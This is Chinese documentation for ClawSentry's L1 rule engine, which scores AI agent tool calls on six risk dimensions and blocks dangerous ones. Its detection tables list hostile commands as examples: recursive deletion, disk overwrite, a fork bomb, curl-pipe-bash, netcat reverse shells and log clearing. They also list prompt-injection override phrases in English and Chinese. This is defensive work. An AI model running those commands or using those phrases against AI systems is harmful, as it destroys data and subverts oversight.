---
title: L1 规则引擎
description: 纯规则驱动的快速路径决策 — D1-D6 六维评分、短路规则、风险分级
---

# L1 规则引擎

<div class="cs-doc-hero" markdown>
<div class="cs-eyebrow">决策引擎 · L1 规则引擎</div>

## 零外部依赖，毫秒级确定性过滤

L1 是 ClawSentry 三层决策模型的第一层，也是唯一始终在线的决策层。完全基于确定性规则，不调用任何 LLM，通过 D1-D6 六维评分 + 八条短路规则（SC-1..SC-8）在每次工具调用前给出 allow / block / defer 判决，并决定是否升级到 L2/L3 深度审查。

<div class="cs-pill-row" markdown>
<span class="cs-pill">D1-D6 六维评分</span>
<span class="cs-pill">SC-1..SC-8 短路规则</span>
<span class="cs-pill">&lt; 1ms 决策延迟</span>
</div>
</div>

## 概述 {#overview}

L1 是 ClawSentry 三层递进决策模型的**第一层**，也是**唯一始终在线**的决策层。每一个进入 Gateway 的 `CanonicalEvent` 都会经过 L1 评估，无一例外。

L1 完全基于确定性规则，不调用任何 LLM 接口，**零外部依赖**。典型决策延迟 **< 1ms**，确保 Agent 运行时的同步阻塞窗口尽可能短。

!!! info "设计哲学"
    L1 的目标不是"准确地理解意图"，而是**快速过滤已知危险模式**。对于需要语义理解的灰色地带操作，L1 会将其升级到 L2/L3 处理。

**核心特性：**

| 特性 | 描述 |
|------|------|
| 延迟 | < 1ms (纯 CPU 正则匹配) |
| 外部依赖 | 无 (不调用 LLM、不访问网络) |
| 始终在线 | 处理 100% 的事件 |
| 降级行为 | 不适用 (L1 本身就是最终降级兜底) |
| 实现类 | `L1PolicyEngine` |
| 输出 | `RiskSnapshot` + `CanonicalDecision` |
| 注入检测 | D6 三层架构：启发式正则 + Canary Token + 可插拔 EmbeddingBackend |

!!! note "Skill Trust runtime binding rules"
    v0.8.0 起，L1 也消费 Skill Trust runtime evidence：`runtime_path_disallowed`、`runtime_source_ambiguous`、`runtime_path_unverified`、`runtime_content_unverified`、`runtime_content_mismatch`、post-action provenance findings 和 `first_use_skill_package_review` verdict 都会按 profile action 进入 risk snapshot。FSPR、P2 provenance validator 和 L2/L3 只能追加 evidence；canonical allow/defer/block 仍由 Gateway policy engine 产生。

```mermaid
graph TD
    E[CanonicalEvent] --> D1[D1 工具危险度]
    E --> D2[D2 路径敏感度]
    E --> D3[D3 命令模式]
    E --> D4[D4 会话累积]
    E --> D5[D5 信任等级]
    E --> D6[D6 注入检测]

    D1 & D2 & D3 & D4 & D5 --> SC{短路规则?}
    SC -->|命中| RL1[直接定级]
    SC -->|未命中| BS[基础评分 base_score]
    D6 --> MUL[注入乘数 × 1.0-1.5]
    BS --> MUL
    MUL --> CS[合成评分 composite_score]
    CS --> RL2[评分定级]
    RL1 & RL2 --> RS[RiskSnapshot]
    RS --> DEC[风险→判决映射]
    DEC --> CD[CanonicalDecision]
```

---

## D1-D6 六维评分体系 {#d1-d6}

ClawSentry 将每个事件分解为六个风险维度进行评分。D1-D5 产生整数分值并互相独立；D6 采用连续浮点值，作为乘数放大基础评分，专门捕捉提示词注入和命令注入企图。

### D1 — 工具类型危险度 {#d1}

**取值范围：0-3**

D1 根据事件中 `tool_name` 字段判断工具的固有危险程度。不同类型的工具被预分类到四个危险等级。

| 分值 | 等级 | 工具列表 | 含义 |
|:----:|------|----------|------|
| **0** | 只读 | `read_file`, `list_dir`, `search`, `grep`, `glob`, `cat`, `head`, `tail` 等 | 不会产生任何副作用 |
| **1** | 有限写入 | `write_file`, `edit_file`, `create_file`, `edit`, `write` | 在用户工作空间内写入文件 |
| **2** | 系统交互 | `http_request`, `install_package`, `fetch`, `web_fetch` | 与外部系统交互，有潜在副作用 |
| **3** | 高危 | `exec`, `sudo`, `chmod`, `chown`, `mount`, `kill`, `pkill` | 直接操作系统级资源 |

!!! warning "特殊处理：bash/shell 工具"
    当 `tool_name` 为 `bash`、`shell`、`terminal` 或 `command` 时，D1 不直接分类，而是进一步检查命令内容：

    - 若命令匹配高危模式 (D3 patterns) → D1=3
    - 若命令涉及系统路径 (`/etc/`, `/usr/`, `/var/` 等) → D1=3
    - 其他情况 → D1=2

```python
# 内部分类集合（简化展示）
_D1_READONLY_TOOLS = {"read_file", "list_dir", "search", "grep", "glob", ...}
_D1_LIMITED_WRITE  = {"write_file", "edit_file", "create_file", ...}
_D1_SYSTEM_TOOLS   = {"http_request", "install_package", "fetch", ...}
_D1_HIGH_DANGER    = {"exec", "sudo", "chmod", "chown", "mount", ...}
```

!!! note "缺失 tool_name 的保守回退"
    当事件缺少 `tool_name` 字段时，D1 取保守默认值 **2**，并在 `missing_dimensions` 中记录 `"d1"`。

---

### D2 — 目标路径敏感度 {#d2}

**取值范围：0-3**

D2 分析事件涉及的文件路径，判断目标资源的敏感程度。路径从 `payload` 中的 `path`、`file_path`、`file`、`target`、`destination`、`source` 字段提取，也会从 `command` 字段中启发式解析。

| 分值 | 等级 | 匹配模式 | 示例 |
|:----:|------|----------|------|
| **0** | 安全 | 用户工作空间内的常规文件（无敏感模式） | `./src/main.py`, `README.md` |
| **1** | 配置 | `\.config\.`、`\.env`、`\.rc$`、`Makefile$`、`Dockerfile$`、`docker-compose` | `.env.local`, `Dockerfile` |
| **2** | 凭证 | `is_credential_path()`：`.env`、`.pem`、`.key`、`.p12`、`.pfx`、`.jks`、`.keystore`、`id_rsa`、`id_ed25519`、`credentials`、`.secret`、`.token`、`.password`、`.aws/`、`.ssh/`，或路径含 `.gnupg/` | `~/.ssh/id_rsa`, `cert.pem` |
| **3** | 系统关键 | `^(/etc/\|/usr/\|/var/\|/sys/\|/proc/\|/boot/)` | `/etc/shadow`, `/proc/1/maps` |

```python
# risk_snapshot.py
_D2_SYSTEM_CRITICAL = re.compile(r"^(/etc/|/usr/|/var/|/sys/|/proc/|/boot/)")
_D2_CONFIG_PATTERNS = re.compile(r"(\.config\.|\.env|\.rc$|Makefile$|Dockerfile$|docker-compose)", re.I)
# 凭证路径委托给 risk_signals.is_credential_path() — 见下方
```

```python
# risk_signals.py：凭证路径正则（共享于多个分析器）
_CREDENTIAL_PATH_RE = re.compile(
    r"\.(env|pem|key|p12|pfx|jks|keystore)(?:$|[^a-z0-9])|"
    r"id_rsa|id_ed25519|credentials|\.secret|\.token|\.password|"
    r"\.aws/|\.ssh/",
    re.IGNORECASE,
)
```

!!! tip "多路径取最大值"
    当一个事件涉及多个路径时（例如 `cp /etc/shadow /tmp/leak`），D2 取所有路径分值的**最大值**。

!!! note "缺失路径的保守回退"
    当 `_extract_paths(event)` 返回空（既无 `path/file_path/...` 字段，也无可解析的命令行路径）时，D2 取保守默认值 **1**，并在 `missing_dimensions` 中记录 `"d2"`。

---

### D3 — 命令模式危险度 {#d3}

**取值范围：0-3**

D3 只对 bash/shell/exec 类工具生效，分析 `payload.command` 字段中的具体命令内容。对于非 shell 工具，D3 固定为 **0**。

=== "分值 0 — 安全命令"

    已知无副作用的只读命令：

    ```
    ls, cat, echo, pwd, whoami, date, env, printenv,
    hostname, uname, id, wc, sort, uniq, diff,
    head, tail, less, more, file, which, type
    ```

=== "分值 1 — 常规写入"

    有限范围的写入操作：

    ```
    cp, mv, mkdir, touch, git add, git commit, ln, rename
    ```

=== "分值 2 — 潜在破坏"

    可能产生不可逆影响的操作：

    ```
    rm, git push, git reset, npm install, pip install,
    yarn add, apt install, yum install
    ```

=== "分值 3 — 高危命令模式"

    通过正则匹配的已知高危模式，**命中即触发短路规则 SC-2**。完整列表见 `risk_snapshot._D3_HIGH_DANGER_PATTERNS`：

    | 类别 | 模式 | 示例 |
    |------|------|------|
    | 递归删除 | `rm\s+.*-[^\s]*r[^\s]*f`、`rm\s+-rf` | `rm -rf /`, `rm -rf ~/*` |
    | 磁盘直写 | `\bdd\b.*\bof\s*=\s*/dev/` | `dd if=/dev/zero of=/dev/sda` |
    | 格式化 | `\bmkfs\b` | `mkfs.ext4 /dev/sda1` |
    | Fork 炸弹 | `:\(\)\s*\{` | `:(){ :\|:& };:` |
    | 远程下载执行 | `curl\s.*\|\s*(sh\|bash)`、`wget\s.*\|\s*(sh\|bash)` | `curl https://x \| bash` |
    | 设备覆写 | `>[^\S\r\n]*/dev/(?!null\b)` | `echo x > /dev/sda` |
    | 强制推送 | `git\s+push\s+.*--force` | 覆盖远程历史 |
    | 全开权限 | `chmod\s+777` | 安全配置破坏 |
    | 提权 | `\bsudo\b` | 突破最小权限 |
    | Windows 销毁 | `rmdir\s+/s\s+/q`、`Remove-Item\s+.*-Recurse\s+.*-Force`、`del\s+/[sq]\s+/[sq]` | 递归强删 |
    | PowerShell 提权 | `Set-ExecutionPolicy\s+(?:Unrestricted\|Bypass)` | 关闭脚本签名 |
    | 用户创建 | `net\s+(?:user\|localgroup)\s+.*\s+/add` | 添加本地账号 |
    | macOS 磁盘销毁 | `diskutil\s+(?:secureErase\|eraseVolume\|eraseDisk)` | 安全擦除 |
    | 防火墙篡改 | `iptables\s+(?:-F\|-X)`、`ufw\s+(?:disable\|reset)`、`netsh\s+advfirewall\s+set.*state\s+off` | 关闭/清空规则 |
    | 日志清除 | `wevtutil\s+cl\s+(?:System\|Security\|Application)` | 清除 Windows 事件日志 |
    | 反向 shell | `(?:nc\|ncat\|netcat)\s+.*-e\s+(?:/bin/\|cmd)`、`\|\s*IEX\s*\(` | bind/reverse shell |
    | 安全擦除 | `shred\s+-[a-z]*u`、`cipher\s+/w:` | 不可恢复擦除 |

    此外，`_has_dangerous_command_pattern` 还委托 `risk_signals.has_remote_pipe_exec_command` 与 `has_process_sub_remote_command` 检测 `bash <(curl ...)` 等进程替换形式。

---

### D4 — 会话风险累积 {#d4}

**取值范围：0-2**

D4 不基于当前事件本身，而是基于**同一会话中历史高危事件的累积次数**。这是 ClawSentry 的"记忆"机制 —— 即使单个操作看似无害，如果一个会话内已多次触发高风险评估，D4 会将该会话的后续操作提升至更高警戒级别。

| 分值 | 条件 | 含义 |
|:----:|------|------|
| **0** | 高危事件数 < 2 | 正常会话 |
| **1** | 2 <= 高危事件数 < 5 | 会话有异常倾向 |
| **2** | 高危事件数 >= 5 | 会话高度可疑 |

D4 由 `SessionRiskTracker` 维护，每当一个事件的最终风险等级为 HIGH 或 CRITICAL 时，该会话的高危计数加一。

```python
class SessionRiskTracker:
    """追踪每个会话的高危事件累积。"""
    DEFAULT_MAX_SESSIONS = 10_000   # LRU 淘汰上限

    def get_d4(self, session_id: str) -> int:
        count = self._high_risk_counts.get(session_id, 0)
        if count >= 5: return 2
        if count >= 2: return 1
        return 0

    def record_high_risk_event(self, session_id: str) -> None:
        self._high_risk_counts[session_id] = (
            self._high_risk_counts.get(session_id, 0) + 1
        )
```

!!! abstract "与 SessionEnforcementPolicy 的关系"
    D4 记录会话级风险趋势供评分使用，而 `SessionEnforcementPolicy` 是更激进的策略层 —— 当累积高危次数超过阈值时，直接将整个会话锁定为强制 DEFER/BLOCK/L3 模式。两者互相补充但独立运作。

### D4 频率异常检测 {#d4-frequency}

除了历史高危事件累积之外，`SessionRiskTracker` 还内置**频率异常检测**（E-8），捕捉同一工具被异常高频调用的行为（如爆破、遍历、批量写入等）：

| 模式 | 触发条件 | D4 加分 | 说明 |
|------|---------|:-------:|------|
| **Burst** | 同一工具 ≥ 10 次 / 5 秒 | → d4=2 | 短时高频调用，疑似脚本化攻击 |
| **Repetitive** | 同一工具 ≥ 20 次 / 60 秒 | → d4=1 | 分钟级重复调用，疑似遍历 |
| **Rate** | 所有工具合计 ≥ 60 次 / 分钟 | → d4=1 | 整体速率过高，疑似自动化操作 |

三种模式独立检测，`D4 = max(历史累积分, 频率异常分)`。

```bash
# 频率检测配置变量
CS_D4_FREQ_BURST_COUNT=10          # burst 触发阈值（次数）
CS_D4_FREQ_BURST_WINDOW_S=5.0      # burst 时间窗口（秒）
CS_D4_FREQ_REPETITIVE_COUNT=20     # repetitive 触发阈值
CS_D4_FREQ_REPETITIVE_WINDOW_S=60.0
CS_D4_FREQ_RATE_LIMIT_PER_MIN=60   # rate 整体速率阈值（次/分钟）
```

!!! tip "如何关闭频率检测"
    若项目中 Agent 有合法的高频调用需求（如批量代码生成），可调高阈值或设置 `CS_D4_FREQ_BURST_COUNT=9999` 有效禁用。

---

### D5 — Agent 信任等级 {#d5}

**取值范围：0-2**

D5 基于 `DecisionContext` 中的 `agent_trust_level` 字段，评估发出请求的 Agent 是否被授予了适当的信任级别。

| 分值 | 信任等级 | 含义 |
|:----:|----------|------|
| **0** | `PRIVILEGED` / `ELEVATED` | 已获显式提权，降低风险权重 |
| **1** | `STANDARD` | 默认信任级别 |
| **2** | `UNTRUSTED` | 未认证或低信任 Agent |

!!! note "缺失上下文的保守回退"
    当 `DecisionContext` 为空或 `agent_trust_level` 未设置时，D5 取保守默认值 **2**（视为不信任），并在 `missing_dimensions` 中记录 `"d5"`。

---

### D6 — 注入检测 {#d6}

**取值范围：0.0-3.0（连续浮点值）**

D6 是 ClawSentry E-4 引入的第六个风险维度，专门检测提示词注入（Prompt Injection）和命令注入（Command Injection）企图。与 D1-D5 的整数评分不同，D6 采用连续浮点值，通过三层检测架构综合评分。

**三层检测架构：**

| 层级 | 名称 | 机制 | 分值贡献 |
|:----:|------|------|---------|
| **Layer 1** | 启发式正则 | 弱模式（22 条，含中文，+0.3/条，上限 1.5）<br>强模式（17 条，含中文，+0.8/条，上限 2.4）<br>工具特定模式（+0.5/条，上限 1.0） | 0.0–3.0 |
| **Layer 2** | Canary Token | 在载荷中嵌入随机 token，检测是否泄露到外部 | +1.5（若命中） |
| **Layer 3** | 向量相似度 | 可插拔 `EmbeddingBackend` Protocol，与已知攻击语料比较余弦相似度（阈值 0.75） | 0.0–2.0 |

最终 D6 = min(Layer1 + Layer2 + Layer3, 3.0)。

=== "弱模式（22 条，每条 +0.3）"

    偏向误导性话术，触发条件宽松。含 10 条英文模式 + 12 条中文模式：

    **英文模式：**

    - `ignore previous instructions`
    - `disregard above` / `disregard prior`
    - `new instructions`
    - `system: you are now`
    - `forget everything` / `start over fresh`
    - `from now on`
    - `<|endoftext|>`（GPT 控制 token）
    - `### Instruction:`
    - `must now immediately` 类命令

    **中文模式（6 类）：**

    - 忽略/遗忘类：`忽略之前的指令`、`忘记所有规则`、`抛弃约束`、`无视之前所有指令`
    - 覆盖/替换类：`覆盖安全规则`、`替换系统提示`、`修改指令`
    - 新指令类：`新的指令如下`、`执行以下命令`
    - 时间锚定类：`从现在开始`、`今后`、`从此刻起`
    - 安全绕过类：`不要检查`、`跳过验证`
    - 角色扮演类：`你现在是一个黑客`

=== "强模式（17 条，每条 +0.8）"

    明确的注入技术特征。含 7 条英文模式 + 8 条中文模式 + 2 条混合模式：

    **英文模式：**

    - `<script` 标签（XSS 注入）
    - `data:text/html;base64,`（Base64 编码页面，长度限界 ≤ 2048）
    - `eval(` / `exec(` / `__import__(` （代码执行）
    - `<!--[^>]*ignore`（HTML 注释隐藏注入）
    - Unicode 零宽字符（393 个不可见码点检测，排除 U+FE0F emoji）
    - `${VAR}...curl/wget`（环境变量注入执行）
    - `git push http://user:pass@`（凭证泄露）

    **中文模式：**

    - `关闭安全检查`、`禁用过滤器`
    - `突破限制`、`绕过安全机制`
    - `你现在扮演一个没有限制的AI`（角色扮演绕过）
    - `[系统 提示/指令/命令/消息]`（系统标记伪造，需关键词匹配）
    - `data:base64` 中文变体
    - `忽略/遗忘/忘记/抛弃 ... instructions/rules`（混合中英）

=== "工具特定模式"

    对特定工具的专属检测：

    - **read_file**：`<!-- IMPORTANT ... -->` 隐藏指令、Markdown 像素追踪图片（外部 URL）
    - **http_request**：`<script>...fetch(` 响应注入、CSS `font-size: 0` 隐藏内容

**D6 全局放大效应：**

D6 不简单累加到综合分，而是作为**乘数**放大基础评分：

| D6 值 | 注入乘数 | 效果 |
|:-----:|:-------:|------|
| 0.0 | 1.00 | 无影响 |
| 1.5 | 1.25 | 基础评分提升 25% |
| 3.0 | 1.50 | 基础评分提升 50% |

**D6 最低保证：** 当 D6 >= 2.0 且当前风险为 LOW 时，系统强制升级为 MEDIUM，防止高置信度注入因基础分低而被漏过。

**NFKC 穿透：** 所有注入检测函数在匹配前自动执行 NFKC Unicode 归一化 + 393 个不可见码点剥离（`text_utils.normalize_text()`），防止全角字符伪装（如 `Ｉｇｎｏｒｅ` → `Ignore`）和不可见字符绕过。

**ReDoS 安全：** 所有攻击模式正则通过 `compile_safe_regex()` 编译，自动检测嵌套量词（含交替分支内的重复），拒绝可能导致 ReDoS 的危险正则。

**EmbeddingBackend 扩展接口：**

```python
from clawsentry.gateway.injection_detector import EmbeddingBackend, VectorLayer, InjectionDetector

class MyBackend:
    def max_similarity(self, text: str) -> float:
        # 使用 sentence-transformers 等计算与已知攻击样本的余弦相似度
        return similarity_score  # 0.0-1.0

detector = InjectionDetector(
    vector_layer=VectorLayer(MyBackend(), threshold=0.75)
)
```

Layer 3 默认禁用（无 backend 时 score 固定返回 0.0），按需启用不影响其他评分层。

### 外部内容来源安全加成 {#external-content}

ClawSentry 通过 `infer_content_origin()` 推断每个事件的内容来源，对来自**外部输入**（网络响应、用户粘贴文本等）的事件额外增加安全权重：

| 来源类型 | 推断依据 | D6 额外加成 | post-action 乘数 |
|---------|---------|:-----------:|:----------------:|
| **external** | `tool_name` 为 `web_fetch`/`http_request` 等，或 `_clawsentry_meta.content_origin=external` | +0.3 | ×1.3 |
| **user** | 用户直接输入 | 无 | 无 |
| **unknown** | 无法推断 | 无 | 无 |

来源推断结果注入 `CanonicalEvent._clawsentry_meta.content_origin`，供 D6 注入检测和 Post-action 分析器读取。

```bash
CS_EXTERNAL_CONTENT_D6_BOOST=0.3               # 外部内容 D6 额外加分（默认 0.3）
CS_EXTERNAL_CONTENT_POST_ACTION_MULTIPLIER=1.3  # 外部内容 post-action 评分乘数
```

---

## 评分合成 {#scoring}

六个维度评分完成后，ClawSentry 按以下流程合成最终风险等级。

### 短路规则 {#short-circuit}

短路规则在合成评分**之前或之后**触发：SC-4 / SC-7 与基于 D1-D3 的 SC-1..SC-3 在 base_score 之前检查；SC-8 在 effect/taint 证据合并阶段触发。一旦命中即直接确定（或最低保证）风险等级。`RiskSnapshot.short_circuit_rule` 字段记录命中的规则名（仅允许 `SC-1..SC-8`）。

| 规则 ID | 条件 | 触发结果 | 说明 |
|:-------:|------|:--------:|------|
| **SC-1** | `D1==3 and D2>=2` | `CRITICAL` | 高危工具 + 敏感路径 → 绝对禁止 |
| **SC-2** | `D3==3` | `CRITICAL` | 高危命令模式（`rm -rf`、fork bomb、`curl \| sh` 等）→ 绝对禁止 |
| **SC-3** | `D1==0 and D2==0 and D3==0` | `LOW` | 纯只读操作 → 安全放行 |
| **SC-4** | `effect_envelope` 含 `disabled_capability_equivalent` 且 `confidence == "high"` | `MEDIUM`（normal）/ `HIGH`（strict、benchmark） | 已禁用工具的等价能力调用 → operator review |
| **SC-7** | `script_analysis_unavailable` 或 `wrapper_chain_unresolved`，且 `mode in {strict, benchmark}` | `HIGH` | 脚本/包装链无法解析（仅严格模式触发） |
| **SC-8** | `generated_script_future_exec` 证据 + 低信任 skill 证据 | `MEDIUM`（normal）/ `HIGH`（strict、benchmark），并产生 `DEFER` | 写入未来执行入口的脚本 → operator review |

!!! note "SC-5 / SC-6 已保留预设"
    `RiskSnapshot.short_circuit_rule` 验证器接受 `SC-1..SC-8`，但当前代码路径未发出 `SC-5` / `SC-6`，作为后向兼容预留。

!!! example "短路示例"
    `sudo rm -rf /etc/shadow`：D1=3、D2=3、D3=3，命中 SC-1 与 SC-2（首匹配为 SC-1），直接定级为 CRITICAL，无需计算合成分。

### 合成评分公式 {#composite-formula}

当没有短路规则命中时，按以下 v2 公式计算合成分：

\[
\text{base\_score} = 0.4 \times \max(D1, D2, D3) + 0.25 \times D4 + 0.15 \times D5
\]

\[
\text{composite\_score} = \text{base\_score} \times \left(1.0 + 0.5 \times \frac{D6}{3.0}\right)
\]

```mermaid
flowchart TD
    INPUT["CanonicalEvent\n(pre_action)"]
    SC{短路规则\n命中?}
    D1D2D3["计算 max(D1,D2,D3)\nD4, D5"]
    BASE["base_score =\n0.4×max(D1,D2,D3) + 0.25×D4 + 0.15×D5"]
    D6CHECK{D6 > 0?}
    MUL["composite = base × (1.0 + 0.5×D6/3.0)\n最大放大倍数 1.5×"]
    NOMUL["composite = base_score\n(D6=0, 公式退化)"]
    LEVEL["风险等级映射\nLOW / MEDIUM / HIGH / CRITICAL"]

    INPUT --> SC
    SC -->|"SC-1/SC-2 命中"| CRIT["直接 CRITICAL"]
    SC -->|"SC-3 命中"| LOW["直接 LOW"]
    SC -->|"未命中"| D1D2D3
    D1D2D3 --> BASE
    BASE --> D6CHECK
    D6CHECK -->|"是"| MUL
    D6CHECK -->|"否"| NOMUL
    MUL & NOMUL --> LEVEL
```

D6 作为注入乘数（范围 1.0-1.5）放大基础评分；D6=0 时公式退化为纯 base_score，完全向后兼容。

**D6 乘数对 base_score 的放大效果示例（base=1.20，有历史高危记录会话中的 pip install，D4=1）：**

| D6 值 | 乘数公式 `1.0 + 0.5×(D6/3.0)` | 乘数 | base=1.20 时 composite | 风险等级变化 |
|:-----:|-------------------------------|:----:|:---------------------:|:-----------:|
| 0.0 | 1.0 + 0.5 × 0.00 | **1.00** | 1.20 | MEDIUM（触发 L2） |
| 1.5 | 1.0 + 0.5 × 0.50 | **1.25** | 1.50 | HIGH → BLOCK |
| 2.0 | 1.0 + 0.5 × 0.67 | **1.33** | 1.60 | HIGH → BLOCK |
| 3.0 | 1.0 + 0.5 × 1.00 | **1.50** | 1.80 | HIGH → BLOCK |

> D6 ≥ 1.5 时，将原本处于 MEDIUM 区间的操作直接提升为 HIGH 拦截。

### 评分→风险等级映射 {#score-to-level}

| 合成分范围 | 风险等级 |
|:----------:|:--------:|
| < 0.8 | `LOW` |
| 0.8 – 1.5 | `MEDIUM` |
| 1.5 – 2.2 | `HIGH` |
| >= 2.2 | `CRITICAL` |

---

## 风险→判决映射 {#risk-to-verdict}

L1 将风险等级映射为 `CanonicalDecision`，判决结果取决于事件类型和风险等级的组合。

### 按事件类型分流

```mermaid
graph TD
    E[CanonicalEvent] --> ET{event_type?}
    ET -->|post_action / post_response / error / session| OBS[ALLOW — 仅观测]
    ET -->|pre_prompt| FO[ALLOW — fail-open]
    ET -->|pre_action| RA{risk_level?}

    RA -->|LOW| AL[ALLOW]
    RA -->|MEDIUM| AM[ALLOW + 审计]
    RA -->|HIGH| BH[BLOCK]
    RA -->|CRITICAL| BC[BLOCK]
```

!!! abstract "事件类型与阻塞语义"
    - **非阻塞事件** (`post_action`, `post_response`, `error`, `session`)：始终 ALLOW。这些事件是已完成动作的通知，阻塞没有意义。
    - **pre_prompt**：始终 ALLOW (fail-open)。不阻止用户输入。
    - **pre_action**：唯一的阻塞控制点。根据风险等级决定放行或拦截。

### pre_action 的判决矩阵

| 风险等级 / 信号 | 判决 | 语义 |
|:--------:|:----:|------|
| `LOW`（无 DEFER 信号） | `ALLOW` | 安全操作，直接放行 |
| `MEDIUM`（无 DEFER 信号） | `ALLOW` | 放行但记录审计日志，同时触发 L2 分析（除非 benchmark 关闭） |
| `HIGH` | `BLOCK` | 高风险操作，拦截并返回拒绝原因 |
| `CRITICAL` | `BLOCK` | 绝对禁止，无条件拦截 |
| `rule_hits` 含 `disabled_capability_equivalent`（且未升级到 HIGH/CRITICAL） | `DEFER`（`final=False`） | Disabled 工具等价能力 → operator review |
| `first_use_action == "defer"` | `DEFER` | Skill 首次使用扫描需要 operator 审核 |
| `short_circuit_rule == "SC-8"` | `DEFER` | 未来执行入口写入 + 低信任 skill 证据 |
| Session scope 评估输出 `DENY` / `DEFER` | `BLOCK` / `DEFER` | 由 `session-scope` 策略层覆盖（policy_id 改为 `session-scope`） |

非阻塞事件类型（`post_action`、`post_response`、`error`、`session`、`pre_prompt`）始终返回 `ALLOW`，由 L1 引擎直接 short-circuit。

---

## 风险评估快照（RiskSnapshot） {#risk-snapshot}

`RiskSnapshot` 是 L1 评估的完整输出，**Pydantic frozen 模型**，一旦生成即不可变。它在整个决策和重试生命周期中保持不变，是后续 L2/L3 分析的基准输入。

```python
class RiskSnapshot(BaseModel):
    model_config = ConfigDict(frozen=True)

    risk_level: RiskLevel                      # 最终风险等级
    composite_score: float                     # >= 0；v2: base × injection_multiplier
    dimensions: RiskDimensions                 # D1-D6 各维度分值
    short_circuit_rule: Optional[str]          # SC-1..SC-8 或 None
    missing_dimensions: list[str]              # 例如 ["d1", "d5"]
    classified_by: ClassifiedBy                # L1 / L2 / L3 / manual
    classified_at: str                         # UTC ISO8601
    override: Optional[RiskOverride]           # L2 升级时的原始等级与原因
    l1_snapshot: Optional[RiskSnapshot]        # L2 升级时保留的 L1 原始快照
    l3_trace: Optional[dict]                   # L3 推理轨迹（exclude=True，不外发）
    l2_l3_summary: Optional[dict]              # L2/L3 执行摘要
    rule_hits: list[str]                       # skill-trust / effect / taint 规则命中
    skill_trust_findings: list[dict]           # skill 信任评估证据
    taint_flow_summary: Optional[dict]         # 污点流证据（rule_ids、command_hash 等）
    effect_summary: Optional[dict]             # 行为效果归一化摘要
```

!!! note "ClassifiedBy 枚举"
    `L1`、`L2`、`L3`、`manual`。L1 引擎首次产出时为 `L1`；当 L2/L3 升级了风险等级后，`classified_by` 改为对应层（`L2` 或 `L3`），且 `l1_snapshot` 字段保留升级前的原始快照。

### RiskDimensions 字段

```python
class RiskDimensions(BaseModel):
    d1: int    = Field(..., ge=0, le=3)   # 工具类型危险度
    d2: int    = Field(..., ge=0, le=3)   # 目标路径敏感度
    d3: int    = Field(..., ge=0, le=3)   # 命令模式危险度
    d4: int    = Field(..., ge=0, le=2)   # 会话风险累积（含 E-8 频率）
    d5: int    = Field(..., ge=0, le=2)   # Agent 信任等级
    d6: float  = Field(default=0.0, ge=0.0, le=3.0)   # 注入检测评分
```

### rule_hits 常见来源

`rule_hits` 是一个字符串列表，记录 L1 评估期间触发的非 D1-D6 主线信号，主要来自三类：

| 来源 | 示例 rule_id | 含义 |
|------|-------------|------|
| Skill Trust | `unknown_skill_identity`、`skill_hash_mismatch`、`ambiguous_skill_alias`、`provenance_label_mismatch`、`first_use_scan_not_started` | 见 [Skill Trust](../advanced/skill-trust.md) |
| Effect Envelope | `disabled_capability_equivalent`、`generated_script_future_exec`、`script_analysis_unavailable`、`wrapper_chain_unresolved` | 行为效果归一化命中 |
| Taint Flow | `remote_fetch_to_interpreter`、`sensitive_source_to_network_sink`、`archive_extract_then_execute`、`bulk_destructive_sequence`、`persistence_entrypoint_write`、`spreadsheet_downstream_payload` | 多步污点链 |

---

## 实际评估示例 {#examples}

以下示例展示不同命令在 D1-D6 各维度的评分过程和最终判决。

### 示例 1：安全的只读操作

```
Event: tool_name="read_file", payload={"path": "src/main.py"}
Agent: STANDARD trust
Session: 首次事件
```

| 维度 | 分值 | 原因 |
|:----:|:----:|------|
| D1 | 0 | `read_file` 属于只读工具集 |
| D2 | 0 | `src/main.py` 不匹配任何敏感路径模式 |
| D3 | 0 | 非 bash/shell 工具，固定为 0 |
| D4 | 0 | 会话内无高危历史 |
| D5 | 1 | STANDARD 信任等级 |

**短路检查：** 命中 SC-3 (D1=0, D2=0, D3=0) → 直接定级 `LOW`

**判决：** `ALLOW` — 安全放行

---

### 示例 2：中等风险的包安装

```
Event: tool_name="bash", payload={"command": "pip install requests"}
Agent: STANDARD trust
Session: 1 次高危历史
```

| 维度 | 分值 | 原因 |
|:----:|:----:|------|
| D1 | 2 | `bash` 工具，命令不含高危模式也不涉及系统路径 |
| D2 | 1 | 路径缺失，保守回退 |
| D3 | 2 | `pip install` 匹配潜在破坏模式 |
| D4 | 0 | 高危事件数 < 2 |
| D5 | 1 | STANDARD 信任等级 |

**短路检查：** 无命中
**合成分（v2，D6=0.0）：** base = 0.4×max(2,1,2) + 0.25×0 + 0.15×1 = 0.8 + 0 + 0.15 = **0.95** → `MEDIUM`

**判决：** `ALLOW` (审计记录)，触发 L2 分析

---

### 示例 3：高危系统操作

```
Event: tool_name="bash", payload={"command": "sudo chmod 777 /etc/passwd"}
Agent: UNTRUSTED
Session: 3 次高危历史
```

| 维度 | 分值 | 原因 |
|:----:|:----:|------|
| D1 | 3 | `bash` + 命令含 `sudo`/`chmod 777` 高危模式 |
| D2 | 3 | `/etc/passwd` 匹配系统关键路径 |
| D3 | 3 | `sudo` 和 `chmod 777` 均命中高危模式 |
| D4 | 1 | 高危事件数 = 3 (在 [2,5) 区间) |
| D5 | 2 | UNTRUSTED Agent |

**短路检查：** 命中 SC-1 (D1=3, D2>=2) 和 SC-2 (D3=3) → 直接定级 `CRITICAL`

**判决：** `BLOCK` — 绝对禁止，并记录详细原因

---

### 示例 4：Fork 炸弹

```
Event: tool_name="bash", payload={"command": ":(){ :|:& };:"}
Agent: STANDARD trust
Session: 无历史
```

| 维度 | 分值 | 原因 |
|:----:|:----:|------|
| D1 | 3 | `bash` + 命令匹配高危模式 (fork bomb) |
| D2 | 1 | 无路径信息，保守回退 |
| D3 | 3 | Fork bomb 正则 `:\(\)\s*\{` 命中 |
| D4 | 0 | 无历史 |
| D5 | 1 | STANDARD |

**短路检查：** 命中 SC-2 (D3=3) → 直接定级 `CRITICAL`

**判决：** `BLOCK`

---


## 报表指标不会默认改变 L1 判决 {#reporting-metric-boundary}

当前指标优化新增的 `latest_composite_score`、`session_risk_sum`、`session_risk_ewma`、`risk_points_sum`、`window_risk_summary`、`system_security_posture` 属于报表 / SSE / Dashboard / Enterprise OS 展示合同。它们默认不参与 L1 短路规则、风险等级阈值或 allow/block/defer 判决。

| 字段 | L1 默认读取 | 用途边界 |
|------|-------------|----------|
| `latest_composite_score` | 否 | 展示最新 composite score；L1 仍以当前 snapshot 内部计算为准。 |
